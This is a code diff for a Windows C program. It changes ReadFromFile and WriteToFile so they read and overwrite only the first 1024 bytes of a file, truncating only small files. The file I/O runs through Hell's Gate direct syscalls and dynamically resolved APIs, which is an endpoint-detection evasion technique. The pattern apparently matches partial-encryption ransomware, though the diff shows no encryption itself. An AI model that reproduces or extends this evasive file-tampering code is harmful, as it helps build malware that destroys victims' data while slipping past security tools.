@@ -341,7 +341,7 @@ BOOL ReadFromFile(PBYTE* pData, WCHAR* pfilePath, SIZE_T* szData) {
 	
 	
 	PBYTE buffer = NULL;
-	//DWORD numberOfBytesRead = NULL;
+	DWORD numberOfBytesToRead = NULL;
 	LARGE_INTEGER fileSize = { 0 };  
 	BOOL bSuccess = FALSE;
 	OBJECT_ATTRIBUTES objAttr;
@@ -416,7 +416,14 @@ BOOL ReadFromFile(PBYTE* pData, WCHAR* pfilePath, SIZE_T* szData) {
 		goto _EndFunction;
 	}
 
-	buffer = (PBYTE)HeapAlloc(GetProcessHeap(), 0, (SIZE_T)fileSize.QuadPart);
+	if(fileSize.QuadPart > 1024){
+		numberOfBytesToRead = 1024;
+	}
+	else {
+		numberOfBytesToRead = (DWORD)fileSize.QuadPart;
+	}
+
+	buffer = (PBYTE)HeapAlloc(GetProcessHeap(), 0, (SIZE_T)numberOfBytesToRead);
 	if (!buffer) {
 		goto _EndFunction;
 	}
@@ -429,11 +436,11 @@ BOOL ReadFromFile(PBYTE* pData, WCHAR* pfilePath, SIZE_T* szData) {
 		NULL,       
 		&ioStatusBlock,
 		buffer,       
-		(DWORD)fileSize.QuadPart,           
+		numberOfBytesToRead,           
 		NULL,         
 		NULL);	
 		
-		if(STATUS != 0 || (DWORD)ioStatusBlock.Information != (DWORD)fileSize.QuadPart){
+		if(STATUS != 0 || (DWORD)ioStatusBlock.Information != numberOfBytesToRead){
 		goto _EndFunction;
 	}
 
@@ -444,7 +451,7 @@ BOOL ReadFromFile(PBYTE* pData, WCHAR* pfilePath, SIZE_T* szData) {
 	//}
 
 	*pData = buffer;
-	*szData = (SIZE_T)fileSize.QuadPart;
+	*szData = numberOfBytesToRead;
 	bSuccess = TRUE;
 	buffer = NULL; 
 
@@ -518,16 +525,20 @@ BOOL WriteToFile(PBYTE buffer, WCHAR* pfilePath, SIZE_T numberOfBytesToWrite) {
 		hKernel32,
 		"SetEndOfFile"
 	);
-
+		
 	if (pSetFilePointer(hFile, NULL, NULL, FILE_BEGIN) == INVALID_SET_FILE_POINTER) {
 		goto _EndFunction;
 	}
 
-	if (!pSetEndOfFile(hFile)) {
-		goto _EndFunction;
+
+	if (numberOfBytesToWrite < 1024) {
+		if (!SetEndOfFile(hFile)) {
+			printf("[!] Cannot truncate file %d\n", GetLastError());
+			goto _EndFunction;
+		}
 	}
 
-	
+
 	SIZE_T bytesRemaining = numberOfBytesToWrite;
 	SIZE_T currentOffset = 0;
 	HellsGate(sysCall.NtWriteFile.wSystemCall);
